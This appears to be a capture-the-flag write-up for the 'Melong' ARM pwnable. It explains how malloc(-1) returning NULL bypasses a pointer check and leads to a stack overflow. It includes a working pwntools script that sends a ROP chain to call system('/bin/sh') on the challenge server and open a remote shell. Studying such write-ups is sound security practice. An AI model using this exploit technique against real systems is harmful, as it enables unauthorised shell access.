## Melong - Pwnable Challenge

Melong is a very simple 32-bit ARM binary that has a few menus for the physical training.

```
1. Check your bmi
2. Exercise
3. Register personal training
4. Write daily record
5. Have some health menu
6. Out of the gym
```

The first menu, `check`, takes some input that are pretty meaningless but calls `get_result` function, which does not initialize `exc2` pointer the first time. With that, we trigger the third menu, `PT`, which checks if the newly allocated heap pointer (with a fully controlled size) is the same as `exc2` pointer.

```c
size_t PT()
{
  size_t v0; // r3
  size_t size; // [sp+4h] [bp-10h]
  void *ptr; // [sp+8h] [bp-Ch]
  int i; // [sp+Ch] [bp-8h]

  puts("Let's start personal training");
  puts("How long do you want to take personal training?");
  _isoc99_scanf("%d", &size);
  ptr = malloc(size);
  if ( ptr == (void *)exc2 )
  {
    puts("Okay, start to exercise!");
    for ( i = 0; i < (signed int)size; ++i )
    {
      puts("you are getting healthy..");
      sleep(1u);
    }
    free(ptr);
    v0 = size;
  }
  else
  {
    puts("Check your bmi again!!");
    free(ptr);
    v0 = 0;
  }
  return v0;
}
```

If we pass in -1 as a size, malloc will fail and `ptr` will be NULL. Since we haven't initialized `exc2`, it's also NULL. So the comparison becomes true. Then, the `size` is casted as "signed int", so the for loop just exits. `free`ing the NULL pointer has no effect. Then, the size we put in gets returned as an unsigned int.

Finally, we use the fourth menu, `write_diary`, to read into a stack buffer. We control the size from above (0xFFFFFFFF), so it becomes a trivial buffer overflow from here. Once we put our ROP chain on the stack, we use the last menu to return.

We exploit it twice to get the libc address leak, followed by the `system("/bin/sh")`.



```python
from pwn import *
import time

context.update(arch='arm')
r = remote('ch41l3ng3s.codegate.kr', 1199)

puts = 0xf66e4770
libc = puts - 0x5e770
system = libc + 0x38634
binsh = libc + 0x12121c

pop_r0 = p32(0x11BBC)

# For leak
#rop  = pop_r0
#rop += p32(0x2301C) # puts_ptr in GOT
#rop += p32(0x104A8) # puts
#rop += p32(0x104F0) # abort

# For shell
rop  = pop_r0
rop += p32(binsh)
rop += p32(system)

r.sendline('1')
r.sendline('0')
r.sendline('0')
r.sendline('3')
r.sendline('-1')
r.sendline('4')
r.sendline('A' * 84 + rop)
pause()

r.sendline('6')

r.readuntil('See you again :)\n')
#puts = u32(r.read(4))
r.interactive()
```

